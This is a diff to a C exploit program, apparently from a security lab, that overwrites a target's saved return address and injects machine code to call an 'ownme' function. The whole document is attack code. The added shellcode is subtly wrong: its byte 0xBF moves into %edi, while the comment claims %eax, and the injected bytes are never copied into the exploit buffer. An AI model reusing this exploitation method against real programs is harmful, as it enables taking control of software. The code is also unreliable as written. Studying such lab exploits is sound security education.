@@ -159,7 +159,7 @@ int main(int argc, char* argv[]) {
 
    // Calculate current address of ra, ownme, rdbuf, and code section of exploit buffer
    unsigned cur_mainloop_ra_loc = cur_mainloop_bp - mainloop_bp_ra_diff;
-   unsigned cur_ownme_addr = cur_mainloop_ra - mainloop_ownme_diff;
+   unsigned cur_ownme_addr = cur_mainloop_ra + mainloop_ownme_diff;
    unsigned cur_rdbuf_addr = cur_mainloop_bp - mainloop_bp_rdbuff_diff;
    unsigned code_addr = cur_rdbuf_addr + 256;
 
@@ -210,11 +210,19 @@ int main(int argc, char* argv[]) {
    exploit[162/sizeof(void*)] = (void*) cur_mainloop_ra_loc + 2;
    exploit[174/sizeof(void*)] = (void*) cur_mainloop_ra_loc + 3;
 
-   put_bin((void*)exploit, explsz);
-   send();
+   // put_bin((void*)exploit, explsz);
+   // send();
 
    // TODO: INJECT CODE TO CALL OWNME AT OFFSET 256 IN EXPLOIT BUFFER
    // MAIN_LOOP'S RA IS ALREADY BEING SET TO POINT TO THIS LOCATION
+
+   char injected_code[] =
+      "\xBF\x00\x00\x00\x00"  /* mov $<ownme_addr>, %eax */
+   ;
+
+   memcpy((char*)injected_code + 1, &cur_ownme_addr, sizeof(unsigned));
+   put_bin((void*)exploit, explsz);
+   send();
 
    // Quit so main returns to our injected code
    put_str("q\n");
